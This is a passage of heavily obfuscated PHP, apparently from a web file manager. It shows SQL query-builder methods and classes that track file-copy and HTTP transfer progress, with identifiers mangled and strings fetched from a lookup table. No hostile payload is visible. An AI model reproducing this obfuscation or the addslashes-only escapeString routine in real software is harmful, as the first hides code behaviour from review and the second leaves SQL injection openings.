$ÖÉ´ø³š[925]; $²¼‰«†Ñ .= $this->parseLock(isset($óØ–Ÿ¡à[$ÖÉ´ø³š[862]]) ? $óØ–Ÿ¡à[$ÖÉ´ø³š[862]] : !1); $²¼‰«†Ñ .= $this->parseComment(!empty($óØ–Ÿ¡à[$ÖÉ´ø³š[354]]) ? $óØ–Ÿ¡à[$ÖÉ´ø³š[354]] : $ÖÉ´ø³š[12]); return $this->execute($²¼‰«†Ñ, $this->parseBind(!empty($óØ–Ÿ¡à[$ÖÉ´ø³š[285]]) ? $óØ–Ÿ¡à[$ÖÉ´ø³š[285]] : array())); } public function selectInsert($º÷ï¸, $×û×éÉ¬, $Ú®ê«·Ù = array()) { $ÛÅ± ¾ =& $_SERVER[ä¿÷‹µ±]; $this->model = $Ú®ê«·Ù[$ÛÅ± ¾[281]]; if (is_string($º÷ï¸)) { $º÷ï¸ = explode($ÛÅ± ¾[50], $º÷ï¸); } array_walk($º÷ï¸, array($this, $ÛÅ± ¾[926])); $ıŠÉÆøÂ = $ÛÅ± ¾[1062] . $this->parseTable($×û×éÉ¬) . $ÛÅ± ¾[923] . implode($ÛÅ± ¾[50], $º÷ï¸) . $ÛÅ± ¾[1040]; $ıŠÉÆøÂ .= $this->buildSelectSql($Ú®ê«·Ù); return $this->execute($ıŠÉÆøÂ, $this->parseBind(!empty($Ú®ê«·Ù[$ÛÅ± ¾[285]]) ? $Ú®ê«·Ù[$ÛÅ± ¾[285]] : array())); } public function update($ŞÍğÎ, $Ó§ÜšÙí) { $ÜôÜì©Ã =& $_SERVER[ä¿÷‹µ±]; $this->model = $Ó§ÜšÙí[$ÜôÜì©Ã[281]]; $öŒ÷íôı = $ÜôÜì©Ã[1063] . $this->parseTable($Ó§ÜšÙí[$ÜôÜì©Ã[279]]) . $this->parseSet($ŞÍğÎ) . $this->parseWhere(!empty($Ó§ÜšÙí[$ÜôÜì©Ã[275]]) ? $Ó§ÜšÙí[$ÜôÜì©Ã[275]] : $ÜôÜì©Ã[12]) . $this->parseOrder(!empty($Ó§ÜšÙí[$ÜôÜì©Ã[365]]) ? $Ó§ÜšÙí[$ÜôÜì©Ã[365]] : $ÜôÜì©Ã[12]) . $this->parseLimit(!empty($Ó§ÜšÙí[$ÜôÜì©Ã[292]]) ? $Ó§ÜšÙí[$ÜôÜì©Ã[292]] : $ÜôÜì©Ã[12]) . $this->parseLock(isset($Ó§ÜšÙí[$ÜôÜì©Ã[862]]) ? $Ó§ÜšÙí[$ÜôÜì©Ã[862]] : !1) . $this->parseComment(!empty($Ó§ÜšÙí[$ÜôÜì©Ã[354]]) ? $Ó§ÜšÙí[$ÜôÜì©Ã[354]] : $ÜôÜì©Ã[12]); return $this->execute($öŒ÷íôı, $this->parseBind(!empty($Ó§ÜšÙí[$ÜôÜì©Ã[285]]) ? $Ó§ÜšÙí[$ÜôÜì©Ã[285]] : array())); } public function delete($Ò“ÀÄ›é = array()) { $™²Òï¼ =& $_SERVER[ä¿÷‹µ±]; $this->model = $Ò“ÀÄ›é[$™²Òï¼[281]]; $‡ŞÛÁƒ§ = $™²Òï¼[1064] . $this->parseTable($Ò“ÀÄ›é[$™²Òï¼[279]]) . $this->parseWhere(!empty($Ò“ÀÄ›é[$™²Òï¼[275]]) ? $Ò“ÀÄ›é[$™²Òï¼[275]] : $™²Òï¼[12]) . $this->parseOrder(!empty($Ò“ÀÄ›é[$™²Òï¼[365]]) ? $Ò“ÀÄ›é[$™²Òï¼[365]] : $™²Òï¼[12]) . $this->parseLimit(!empty($Ò“ÀÄ›é[$™²Òï¼[292]]) ? $Ò“ÀÄ›é[$™²Òï¼[292]] : $™²Òï¼[12]) . $this->parseLock(isset($Ò“ÀÄ›é[$™²Òï¼[862]]) ? $Ò“ÀÄ›é[$™²Òï¼[862]] : !1) . $this->parseComment(!empty($Ò“ÀÄ›é[$™²Òï¼[354]]) ? $Ò“ÀÄ›é[$™²Òï¼[354]] : $™²Òï¼[12]); return $this->execute($‡ŞÛÁƒ§, $this->parseBind(!empty($Ò“ÀÄ›é[$™²Òï¼[285]]) ? $Ò“ÀÄ›é[$™²Òï¼[285]] : array())); } public function select($ˆ¾ö¸«¤ = array()) { $©•—µÄ =& $_SERVER[ä¿÷‹µ±]; $this->model = $ˆ¾ö¸«¤[$©•—µÄ[281]]; $Í‹øïà· = $this->buildSelectSql($ˆ¾ö¸«¤); $¬‰Î•´ = isset($ˆ¾ö¸«¤[$©•—µÄ[349]]) ? $ˆ¾ö¸«¤[$©•—µÄ[349]] : !1; if ($¬‰Î•´) { $ÔÌ²åËŸ = is_string($¬‰Î•´[$©•—µÄ[94]]) ? $¬‰Î•´[$©•—µÄ[94]] : $©•—µÄ[1065] . md5($Í‹øïà·); $»ÅÜßºÔ = think_cache($ÔÌ²åËŸ, $©•—µÄ[12], $¬‰Î•´); if (!1 !== $»ÅÜßºÔ) { return $»ÅÜßºÔ; } } $‰¶Äù¾ó = $this->query($Í‹øïà·, $this->parseBind(!empty($ˆ¾ö¸«¤[$©•—µÄ[285]]) ? $ˆ¾ö¸«¤[$©•—µÄ[285]] : array())); if ($¬‰Î•´ && !1 !== $‰¶Äù¾ó) { think_cache($ÔÌ²åËŸ, $‰¶Äù¾ó, $¬‰Î•´); } return $‰¶Äù¾ó; } public function buildSelectSql($ò±ŠŸ’Ï = array()) { $Û‚¡é¯Š =& $_SERVER[ä¿÷‹µ±]; if (isset($ò±ŠŸ’Ï[$Û‚¡é¯Š[353]])) { if (strpos($ò±ŠŸ’Ï[$Û‚¡é¯Š[353]], $Û‚¡é¯Š[50])) { list($ƒĞ³æÀÈ, $®ü×‹Õò) = explode($Û‚¡é¯Š[50], $ò±ŠŸ’Ï[$Û‚¡é¯Š[353]]); } else { $ƒĞ³æÀÈ = $ò±ŠŸ’Ï[$Û‚¡é¯Š[353]]; } $ƒĞ³æÀÈ = $ƒĞ³æÀÈ ? $ƒĞ³æÀÈ : 1; $®ü×‹Õò = isset($®ü×‹Õò) ? $®ü×‹Õò : (is_numeric($ò±ŠŸ’Ï[$Û‚¡é¯Š[292]]) ? $ò±ŠŸ’Ï[$Û‚¡é¯Š[292]] : 20); $‚£ÛİåØ = $®ü×‹Õò * ((int) $ƒĞ³æÀÈ - 1); $ò±ŠŸ’Ï[$Û‚¡é¯Š[292]] = $‚£ÛİåØ . $Û‚¡é¯Š[50] . $®ü×‹Õò; } if (think_config($Û‚¡é¯Š[1066])) { $¤‰¨çı° = $Û‚¡é¯Š[1067] . md5(serialize($ò±ŠŸ’Ï)); $µÛğ’ = think_cache($¤‰¨çı°); if ($µÛğ’) { return $µÛğ’; } } $êğßÖãè = $this->parseSql($this->selectSql, $ò±ŠŸ’Ï); $êğßÖãè .= $this->parseLock(isset($ò±ŠŸ’Ï[$Û‚¡é¯Š[862]]) ? $ò±ŠŸ’Ï[$Û‚¡é¯Š[862]] : !1); if (isset($¤‰¨çı°)) { think_cache($¤‰¨çı°, $êğßÖãè); } return $êğßÖãè; } public function parseSql($ÎÑÈÀ÷, $ß¥”ö Ç = array()) { $É­ã¹˜İ =& $_SERVER[ä¿÷‹µ±]; $ÎÑÈÀ÷ = str_replace(array($É­ã¹˜İ[1068], $É­ã¹˜İ[1069], $É­ã¹˜İ[1070], $É­ã¹˜İ[1071], $É­ã¹˜İ[1072], $É­ã¹˜İ[1073], $É­ã¹˜İ[1074], $É­ã¹˜İ[1075], $É­ã¹˜İ[1076], $É­ã¹˜İ[1077], $É­ã¹˜İ[1078]), array($this->parseTable("{$ß¥”ö Ç[$É­ã¹˜İ[279]]}"), $this->parseDistinct(isset($ß¥”ö Ç[$É­ã¹˜İ[1079]]) ? $ß¥”ö Ç[$É­ã¹˜İ[1079]] : !1), $this->parseField(!empty($ß¥”ö Ç[$É­ã¹˜İ[273]]) ? $ß¥”ö Ç[$É­ã¹˜İ[273]] : $É­ã¹˜İ[188]), $this->parseJoin(!empty($ß¥”ö Ç[$É­ã¹˜İ[282]]) ? $ß¥”ö Ç[$É­ã¹˜İ[282]] : $É­ã¹˜İ[12]), $this->parseWhere(!empty($ß¥”ö Ç[$É­ã¹˜İ[275]]) ? $ß¥”ö Ç[$É­ã¹˜İ[275]] : $É­ã¹˜İ[12]), $this->parseGroup(!empty($ß¥”ö Ç[$É­ã¹˜İ[515]]) ? $ß¥”ö Ç[$É­ã¹˜İ[515]] : $É­ã¹˜İ[12]), $this->parseHaving(!empty($ß¥”ö Ç[$É­ã¹˜İ[1080]]) ? $ß¥”ö Ç[$É­ã¹˜İ[1080]] : $É­ã¹˜İ[12]), $this->parseOrder(!empty($ß¥”ö Ç[$É­ã¹˜İ[365]]) ? $ß¥”ö Ç[$É­ã¹˜İ[365]] : $É­ã¹˜İ[12]), $this->parseLimit(!empty($ß¥”ö Ç[$É­ã¹˜İ[292]]) ? $ß¥”ö Ç[$É­ã¹˜İ[292]] : $É­ã¹˜İ[12]), $this->parseUnion(!empty($ß¥”ö Ç[$É­ã¹˜İ[347]]) ? $ß¥”ö Ç[$É­ã¹˜İ[347]] : $É­ã¹˜İ[12]), $this->parseComment(!empty($ß¥”ö Ç[$É­ã¹˜İ[354]]) ? $ß¥”ö Ç[$É­ã¹˜İ[354]] : $É­ã¹˜İ[12])), $ÎÑÈÀ÷); return $ÎÑÈÀ÷; } public function getLastSql($¹­ûÖµ = '') { return $¹­ûÖµ ? $this->modelSql[$¹­ûÖµ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¶Òß¸ì˜) { return addslashes($¶Òß¸ì˜); } public function setModel($ÒˆĞ’Ÿ‹) { $this->model = $ÒˆĞ’Ÿ‹; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto Bâ±°– ¸°; a‡­é¥êÂˆ: class TaskFileTransfer extends Task { protected function startAfter() { $™Î†„Ù¥ =& $_SERVER[ä¿÷‹µ±]; $œÔÉòñß =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($™Î†„Ù¥[1706], array($this, $™Î†„Ù¥[1707])); Hook::bind($™Î†„Ù¥[1237], array($this, $™Î†„Ù¥[1708])); Hook::bind($™Î†„Ù¥[1709], array($this, $™Î†„Ù¥[1710])); Hook::bind($™Î†„Ù¥[604], array($this, $™Î†„Ù¥[1711])); Hook::bind($™Î†„Ù¥[605], array($this, $™Î†„Ù¥[1712])); Hook::bind($™Î†„Ù¥[610], array($this, $™Î†„Ù¥[1713])); Hook::bind($™Î†„Ù¥[611], array($this, $™Î†„Ù¥[1714])); Hook::bind($™Î†„Ù¥[607], array($this, $™Î†„Ù¥[1715])); Hook::bind($™Î†„Ù¥[608], array($this, $™Î†„Ù¥[1716])); Hook::bind($™Î†„Ù¥[574], array($this, $™Î†„Ù¥[1717])); Hook::bind($™Î†„Ù¥[571], array($this, $™Î†„Ù¥[1717])); Hook::bind($™Î†„Ù¥[576], array($this, $™Î†„Ù¥[1717])); Hook::bind($™Î†„Ù¥[578], array($this, $™Î†„Ù¥[1717])); Hook::bind($™Î†„Ù¥[580], array($this, $™Î†„Ù¥[1717])); Hook::bind($™Î†„Ù¥[1718], array($this, $™Î†„Ù¥[1719])); Hook::bind($™Î†„Ù¥[597], array($this, $™Î†„Ù¥[1720])); $this->sourceModelCopyFlag = !1; Hook::bind($™Î†„Ù¥[1721], array($this, $™Î†„Ù¥[1722])); Hook::bind($™Î†„Ù¥[1723], array($this, $™Î†„Ù¥[1724])); Hook::bind($™Î†„Ù¥[1725], array($this, $™Î†„Ù¥[1726])); $œÔÉòñß[$™Î†„Ù¥[1727]] = LNG($™Î†„Ù¥[1728]); $œÔÉòñß[$™Î†„Ù¥[1729]] = 0; $œÔÉòñß[$™Î†„Ù¥[1730]] = 0; $œÔÉòñß[$™Î†„Ù¥[1086]] = $™Î†„Ù¥[12]; $œÔÉòñß[$™Î†„Ù¥[1731]] = $™Î†„Ù¥[12]; $œÔÉòñß[$™Î†„Ù¥[1732]] = 0; $œÔÉòñß[$™Î†„Ù¥[1733]] = 0; $œÔÉòñß[$™Î†„Ù¥[1734]] = 0; if (!$œÔÉòñß[$™Î†„Ù¥[1576]]) { $œÔÉòñß[$™Î†„Ù¥[1576]] = LNG($™Î†„Ù¥[1735]); } } protected function endAfter() { $çİÙÛ¾’ =& $_SERVER[ä¿÷‹µ±]; Hook::unbind($çİÙÛ¾’[1706], array($this, $çİÙÛ¾’[1707])); Hook::unbind($çİÙÛ¾’[1237], array($this, $çİÙÛ¾’[1708])); Hook::unbind($çİÙÛ¾’[1709], array($this, $çİÙÛ¾’[1710])); Hook::unbind($çİÙÛ¾’[604], array($this, $çİÙÛ¾’[1711])); Hook::unbind($çİÙÛ¾’[605], array($this, $çİÙÛ¾’[1712])); Hook::unbind($çİÙÛ¾’[610], array($this, $çİÙÛ¾’[1713])); Hook::unbind($çİÙÛ¾’[611], array($this, $çİÙÛ¾’[1714])); Hook::unbind($çİÙÛ¾’[607], array($this, $çİÙÛ¾’[1715])); Hook::unbind($çİÙÛ¾’[608], array($this, $çİÙÛ¾’[1716])); Hook::unbind($çİÙÛ¾’[574], array($this, $çİÙÛ¾’[1717])); Hook::unbind($çİÙÛ¾’[571], array($this, $çİÙÛ¾’[1717])); Hook::unbind($çİÙÛ¾’[576], array($this, $çİÙÛ¾’[1717])); Hook::unbind($çİÙÛ¾’[578], array($this, $çİÙÛ¾’[1717])); Hook::unbind($çİÙÛ¾’[580], array($this, $çİÙÛ¾’[1717])); Hook::unbind($çİÙÛ¾’[1718], array($this, $çİÙÛ¾’[1719])); Hook::unbind($çİÙÛ¾’[597], array($this, $çİÙÛ¾’[1720])); Hook::unbind($çİÙÛ¾’[1721], array($this, $çİÙÛ¾’[1722])); Hook::unbind($çİÙÛ¾’[1723], array($this, $çİÙÛ¾’[1724])); Hook::unbind($çİÙÛ¾’[1725], array($this, $çİÙÛ¾’[1726])); } public function copyMoveStart($ô¸‡³Ğğ, $ñ×ò¡Ñ·, $å‡²µå¥, $ ó³¶Ÿ¬) { $£’õç² =& $_SERVER[ä¿÷‹µ±]; self::log($£’õç²[1736] . $ñ×ò¡Ñ· . $£’õç²[70] . $ ó³¶Ÿ¬); $…­ææÇÉ = rtrim(TEMP_FILES, $£’õç²[8]); if (substr($ñ×ò¡Ñ·, 0, strlen($…­ææÇÉ)) == $…­ææÇÉ) { return; } if (substr($ ó³¶Ÿ¬, 0, strlen($…­ææÇÉ)) == $…­ææÇÉ) { return; } $İ›­Îêƒ =& $this->task; $İ›­Îêƒ[$£’õç²[1737]] = KodIO::transferType($ô¸‡³Ğğ, $å‡²µå¥); $this->update(); } public function updateAfter() { $Ş’ŞƒÜ’ =& $_SERVER[ä¿÷‹µ±]; $¯ŞÄèÛò =& $this->task; if (!$¯ŞÄèÛò[$Ş’ŞƒÜ’[782]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¯ŞÄèÛò[$Ş’ŞƒÜ’[1737]] == $Ş’ŞƒÜ’[1326]) { return; } self::updateTask($¯ŞÄèÛò); } private static function updateTask(&$×˜½œû) { $Ä­¢ƒ¿Ç =& $_SERVER[ä¿÷‹µ±]; if ($×˜½œû[$Ä­¢ƒ¿Ç[1737]] == $Ä­¢ƒ¿Ç[1221] || $×˜½œû[$Ä­¢ƒ¿Ç[1737]] == $Ä­¢ƒ¿Ç[107]) { if ($×˜½œû[$Ä­¢ƒ¿Ç[1731]]) { $×˜½œû[$Ä­¢ƒ¿Ç[1734]] = $×˜½œû[$Ä­¢ƒ¿Ç[1733]] + $×˜½œû[$Ä­¢ƒ¿Ç[1730]]; } } else { if ($×˜½œû[$Ä­¢ƒ¿Ç[1737]] == $Ä­¢ƒ¿Ç[1327]) { if ($×˜½œû[$Ä­¢ƒ¿Ç[1731]] == $Ä­¢ƒ¿Ç[1221]) { $×˜½œû[$Ä­¢ƒ¿Ç[1734]] = $×˜½œû[$Ä­¢ƒ¿Ç[1733]] + $×˜½œû[$Ä­¢ƒ¿Ç[1730]] * 0.5; } else { if ($×˜½œû[$Ä­¢ƒ¿Ç[1731]] == $Ä­¢ƒ¿Ç[107]) { $×˜½œû[$Ä­¢ƒ¿Ç[1734]] = $×˜½œû[$Ä­¢ƒ¿Ç[1733]] + $×˜½œû[$Ä­¢ƒ¿Ç[1729]] * 0.5 + $×˜½œû[$Ä­¢ƒ¿Ç[1730]] * 0.5; } } } } $×˜½œû[$Ä­¢ƒ¿Ç[1680]] = $×˜½œû[$Ä­¢ƒ¿Ç[1734]] / $×˜½œû[$Ä­¢ƒ¿Ç[782]]; if ($×˜½œû[$Ä­¢ƒ¿Ç[1680]] > 0) { $œ§Ù¯æ‚ = timeFloat() - $×˜½œû[$Ä­¢ƒ¿Ç[1682]] - $×˜½œû[$Ä­¢ƒ¿Ç[1685]]; $×˜½œû[$Ä­¢ƒ¿Ç[1686]] = $œ§Ù¯æ‚ * (1 - $×˜½œû[$Ä­¢ƒ¿Ç[1680]]) / $×˜½œû[$Ä­¢ƒ¿Ç[1680]]; } } public function addPath($ª­åöØä) { $ó¤ûÑ—¼ =& $_SERVER[ä¿÷‹µ±]; if (!$ª­åöØä) { return; } $£Ù­¬Ãæ =& $this->task; $µñıëÔ = IO::infoWithChildren($ª­åöØä); $„êéö‘Ğ = $£Ù­¬Ãæ[$ó¤ûÑ—¼[1738]] ? $£Ù­¬Ãæ[$ó¤ûÑ—¼[1738]][$ó¤ûÑ—¼[1739]] : 0; $£Ù­¬Ãæ[$ó¤ûÑ—¼[1738]] = array($ó¤ûÑ—¼[1739] => $„êéö‘Ğ + 1, $ó¤ûÑ—¼[420] => $µñıëÔ[$ó¤ûÑ—¼[32]], $ó¤ûÑ—¼[84] => $µñıëÔ[$ó¤ûÑ—¼[84]], $ó¤ûÑ—¼[519] => $µñıëÔ[$ó¤ûÑ—¼[519]] ? $µñıëÔ[$ó¤ûÑ—¼[519]] : $µñıëÔ[$ó¤ûÑ—¼[84]]); if ($µñıëÔ[$ó¤ûÑ—¼[33]] == $ó¤ûÑ—¼[199]) { $£Ù­¬Ãæ[$ó¤ûÑ—¼[805]] += 1; } else { $£Ù­¬Ãæ[$ó¤ûÑ—¼[805]] += $µñıëÔ[$ó¤ûÑ—¼[79]][$ó¤ûÑ—¼[77]]; if ($µñıëÔ[$ó¤ûÑ—¼[402]]) { $£Ù­¬Ãæ[$ó¤ûÑ—¼[805]] += $µñıëÔ[$ó¤ûÑ—¼[79]][$ó¤ûÑ—¼[78]] + 1; } } $£Ù­¬Ãæ[$ó¤ûÑ—¼[782]] += $µñıëÔ[$ó¤ûÑ—¼[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($çÅõ‘ô‹) { } public function sourceAddHashEnd($ŒÂ¼Şû) { } public function sourceAddFileStart($÷Ü’ß›) { $õ—ƒ±œ¡ =& $_SERVER[ä¿÷‹µ±]; $ØÀ’·™Â =& $this->task; $ØÀ’·™Â[$õ—ƒ±œ¡[1729]] = $÷Ü’ß›[$õ—ƒ±œ¡[76]]; $ØÀ’·™Â[$õ—ƒ±œ¡[1727]] = $÷Ü’ß›[$õ—ƒ±œ¡[32]]; $ØÀ’·™Â[$õ—ƒ±œ¡[1086]] = $÷Ü’ß›[$õ—ƒ±œ¡[32]]; $ØÀ’·™Â[$õ—ƒ±œ¡[1740]] = $÷Ü’ß›[$õ—ƒ±œ¡[84]]; $this->update(); } public function sourceAddFileEnd($¤¥Â‡ç½) { $Îªã¬÷ğ =& $_SERVER[ä¿÷‹µ±]; $œ¼ãŠ©Ø =& $this->task; $œ¼ãŠ©Ø[$Îªã¬÷ğ[1734]] += $¤¥Â‡ç½[$Îªã¬÷ğ[76]]; $œ¼ãŠ©Ø[$Îªã¬÷ğ[1740]] = $¤¥Â‡ç½[$Îªã¬÷ğ[84]]; $this->update(1); } public function copyFileStart($°œÁâÀ”, $Ò°Ğ£òô, $óîÙ¼¼ú, $‡ƒÚ¢û, $¦¢Ò—¨‹, $¤µšÇô˜) { $ æ“ú =& $_SERVER[ä¿÷‹µ±]; $Æ½ùò = $¦¢Ò—¨‹; if ($Æ½ùò == $GLOBALS[$ æ“ú[1741]]) { $Æ½ùò = $GLOBALS[$ æ“ú[1742]]; } $GLOBALS[$ æ“ú[1742]] = $¦¢Ò—¨‹; $GLOBALS[$ æ“ú[1741]] = $¤µšÇô˜; $¡¢‘ŠŸº =& $this->task; $¡¢‘ŠŸº[$ æ“ú[1727]] = $Æ½ùò; $¡¢‘ŠŸº[$ æ“ú[1729]] = (int) $°œÁâÀ”->size($Ò°Ğ£òô); $¡¢‘ŠŸº[$ æ“ú[1730]] = 0; $¡¢‘ŠŸº[$ æ“ú[1086]] = $ æ“ú[12]; $¡¢‘ŠŸº[$ æ“ú[1731]] = $ æ“ú[12]; $¡¢‘ŠŸº[$ æ“ú[1732]] = 0; $Ÿ—²»–® = $¡¢‘ŠŸº[$ æ“ú[1729]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¡¢‘ŠŸº[$ æ“ú[399]] . $ æ“ú[1743]); if ($Ÿ—²»–® && file_exists(get_path_father($‡ƒÚ¢û))) { Cache::set($¡¢‘ŠŸº[$ æ“ú[399]] . $ æ“ú[1743], $‡ƒÚ¢û); $¡¢‘ŠŸº[$ æ“ú[1700]] = array($ æ“ú[1744], $ æ“ú[1745]); } $this->update(0, $Ÿ—²»–®); } public static function updateCopyLocalFileSize($»®¸³¢È) { $Œ±ÕÉ¿ =& $_SERVER[ä¿÷‹µ±]; $Ÿ§ÆíÓï = Cache::get($»®¸³¢È[$Œ±ÕÉ¿[399]] . $Œ±ÕÉ¿[1743]); if (!$Ÿ§ÆíÓï || !file_exists($Ÿ§ÆíÓï)) { return $»®¸³¢È; } $»®¸³¢È[$Œ±ÕÉ¿[1730]] = @filesize($Ÿ§ÆíÓï); $»®¸³¢È[$Œ±ÕÉ¿[1734]] += $»®¸³¢È[$Œ±ÕÉ¿[1730]]; self::updateTask($»®¸³¢È); return $»®¸³¢È; } public function copyFileEnd($ª•ª§×¹, $¥¶ÁÁÓ, $“µ¢ú¾â, $²ñı‹ü, $¾«êÛ–, $”“»¸) { $ï…€Òè¦ =& $_SERVER[ä¿÷‹µ±]; $ØŒ¤ÔœÎ =& $this->task; $ØŒ¤ÔœÎ[$ï…€Òè¦[1730]] = $ØŒ¤ÔœÎ[$ï…€Òè¦[1729]]; $ØŒ¤ÔœÎ[$ï…€Òè¦[1731]] = $ï…€Òè¦[12]; unset($ØŒ¤ÔœÎ[$ï…€Òè¦[1700]]); if ($¾«êÛ– == $ØŒ¤ÔœÎ[$ï…€Òè¦[1727]]) { $ØŒ¤ÔœÎ[$ï…€Òè¦[1733]] += $ØŒ¤ÔœÎ[$ï…€Òè¦[1729]]; $ØŒ¤ÔœÎ[$ï…€Òè¦[1734]] = $ØŒ¤ÔœÎ[$ï…€Òè¦[1733]]; $ı“ªÙ¸× = 1; if (isset($ØŒ¤ÔœÎ[$ï…€Òè¦[1740]]) && $ØŒ¤ÔœÎ[$ï…€Òè¦[1740]] == $¥¶ÁÁÓ) { $ı“ªÙ¸× = 0; } $this->update($ı“ªÙ¸×); } else { $this->update(); $ØŒ¤ÔœÎ[$ï…€Òè¦[1730]] = 0; } Cache::remove($ØŒ¤ÔœÎ[$ï…€Òè¦[399]] . $ï…€Òè¦[1743]); self::log($ï…€Òè¦[1746] . $¥¶ÁÁÓ . $ï…€Òè¦[70] . $²ñı‹ü . $ï…€Òè¦[231] . $¾«êÛ– . $ï…€Òè¦[1747] . $ØŒ¤ÔœÎ[$ï…€Òè¦[1727]]); } public function updateFileEnd($Áºœ¤€, $ëÇáÏÀÚ) { $ìŠªâÎ =& $_SERVER[ä¿÷‹µ±]; $ˆªŞÕÅ =& $this->task; $ˆªŞÕÅ[$ìŠªâÎ[1727]] = $Áºœ¤€; $ˆªŞÕÅ[$ìŠªâÎ[1729]] = $ëÇáÏÀÚ; $ˆªŞÕÅ[$ìŠªâÎ[1733]] += $ëÇáÏÀÚ; $ˆªŞÕÅ[$ìŠªâÎ[1734]] = $ˆªŞÕÅ[$ìŠªâÎ[1733]]; $this->update(1); self::log($ìŠªâÎ[1748] . $Áºœ¤€); } public function sourceModelCopy($†…°Ì±¤) { $¢¿û˜–œ =& $_SERVER[ä¿÷‹µ±]; $â‡º—Ò = $†…°Ì±¤[0]; $–çïˆğ = $†…°Ì±¤[1]; $äŠáéÛ =& $this->task; $this->sourceModelCopyFlag = !0; $¿äÚ’µ = 0; switch ($â‡º—Ò) { case $¢¿û˜–œ[572]: $¿äÚ’µ = 1; break; case $¢¿û˜–œ[575]: $äŠáéÛ[$¢¿û˜–œ[1727]] = $–çïˆğ[$¢¿û˜–œ[32]]; break; case $¢¿û˜–œ[577]: $¿äÚ’µ = intval($†…°Ì±¤[$¢¿û˜–œ[380]] * 0.4); break; case $¢¿û˜–œ[579]: $¿äÚ’µ = intval($†…°Ì±¤[$¢¿û˜–œ[380]] * 0.2); break; case $¢¿û˜–œ[581]: $¿äÚ’µ = intval($†…°Ì±¤[$¢¿û˜–œ[380]] * 0.4); break; } $this->update($¿äÚ’µ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($­àÒˆ£Í, $²†çøÊ—) { $ËÓ¼àÑ– =& $_SERVER[ä¿÷‹µ±]; $this->sourceModelCopyFlag = !0; $ßÇ™‹ŸŸ = 1; if (isset($­àÒˆ£Í[$ËÓ¼àÑ–[79]])) { $ßÇ™‹ŸŸ = $­àÒˆ£Í[$ËÓ¼àÑ–[79]][$ËÓ¼àÑ–[77]]; $ßÇ™‹ŸŸ = $ßÇ™‹ŸŸ + $­àÒˆ£Í[$ËÓ¼àÑ–[79]][$ËÓ¼àÑ–[78]] + 1; } $this->update($ßÇ™‹ŸŸ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Íğè–Ú) { $this->sourceRemove($Íğè–Ú, !1); } public function curlProgress($½ä—“Ş, $‘Â¶‰±ù, $òá²åê½, $¨Ñó›ù, $†ï†¼êÏ) { $ñ®Úø‡ =& $_SERVER[ä¿÷‹µ±]; $¤½³¹€ =& $this->task; if ($†ï†¼êÏ > 0) { $¤½³¹€[$ñ®Úø‡[1086]] = $ñ®Úø‡[1749]; $¤½³¹€[$ñ®Úø‡[1731]] = $ñ®Úø‡[107]; if ($¤½³¹€[$ñ®Úø‡[1729]]) { $¤½³¹€[$ñ®Úø‡[1730]] = $†ï†¼êÏ; } if ($¤½³¹€[$ñ®Úø‡[1732]]) { $¤½³¹€[$ñ®Úø‡[1730]] = $†ï†¼êÏ + $¤½³¹€[$ñ®Úø‡[1732]]; } } else { if ($òá²åê½ > 0) { if ($¤½³¹€[$ñ®Úø‡[1729]] == $‘Â¶‰±ù) { $¤½³¹€[$ñ®Úø‡[1730]] = $òá²åê½; $¤½³¹€[$ñ®Úø‡[1086]] = $ñ®Úø‡[1750]; $¤½³¹€[$ñ®Úø‡[1731]] = $ñ®Úø‡[1221]; } } } $this->update(); } public function curlProgressStart($ÙÅºè Ó) { } public function curlProgressEnd($‹†Ñçˆ†) { $ÂÙªêƒµ =& $_SERVER[ä¿÷‹µ±]; $¨ŸáÜÄ´ =& $this->task; $Šú‹Ÿ€¥ = curl_getinfo($‹†Ñçˆ†); $°š®êÃ‰ = $Šú‹Ÿ€¥[$ÂÙªêƒµ[1751]]; if ($°š®êÃ‰ == -1) { $°š®êÃ‰ = $Šú‹Ÿ€¥[$ÂÙªêƒµ[1752]]; } if ($¨ŸáÜÄ´[$ÂÙªêƒµ[1731]] == $ÂÙªêƒµ[107] && $°š®êÃ‰) { $¨ŸáÜÄ´[$ÂÙªêƒµ[1732]] += $°š®êÃ‰; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $õÚï–¹‘ =& $_SERVER[ä¿÷‹µ±]; $¨ºŒ…â‡ =& $this->task; $¨ºŒ…â‡[$õÚï–¹‘[1753]] = 1; Hook::bind($õÚï–¹‘[1721], array($this, $õÚï–¹‘[1754])); Hook::bind($õÚï–¹‘[1723], array($this, $õÚï–¹‘[1755])); Hook::bind($õÚï–¹‘[1725], array($this, $õÚï–¹‘[1756])); } protected function endAfter() { $—‚ÏÔ¯î =& $_SERVER[ä¿÷‹µ±]; Hook::unbind($—‚ÏÔ¯î[1721], array($this, $—‚ÏÔ¯î[1754])); Hook::unbind($—‚ÏÔ¯î[1723], array($this, $—‚ÏÔ¯î[1755])); Hook::unbind($—‚ÏÔ¯î[1725], array($this, $—‚ÏÔ¯î[1756])); } public function progressStart($å«ü»‡²) { $ªŒ¦ÛâÊ =& $_SERVER[ä¿÷‹µ±]; $šöÜØ‹ = curl_getinfo($å«ü»‡²); self::log($ªŒ¦ÛâÊ[1757] . $šöÜØ‹[$ªŒ¦ÛâÊ[307]]); self::valueSet($this->task[$ªŒ¦ÛâÊ[399]], $this->task); } public function progressEnd($û«òæ•Õ) { $•Ø¨à¯‚ =& $_SERVER[ä¿÷‹µ±]; self::log($•Ø¨à¯‚[1758] . $this->task[$•Ø¨à¯‚[399]]); $this->end(); } public function progress($ƒ¬ë§¢, $ôé–¸½Š, $ŸäÎ¤“, $³¤Òç¥¿, $°‰ãñú›) { $Şãû©ÊÂ =& $_SERVER[ä¿÷‹µ±]; $¾í™¸ƒ¥ =& $this->task; if ($°‰ãñú› > 0) { $¾í™¸ƒ¥[$Şãû©ÊÂ[805]] = $¾í™¸ƒ¥[$Şãû©ÊÂ[805]] == 0 ? $³¤Òç¥¿ : $¾í™¸ƒ¥[$Şãû©ÊÂ[805]]; $¾í™¸ƒ¥[$Şãû©ÊÂ[1679]] = $°‰ãñú›; } else { if 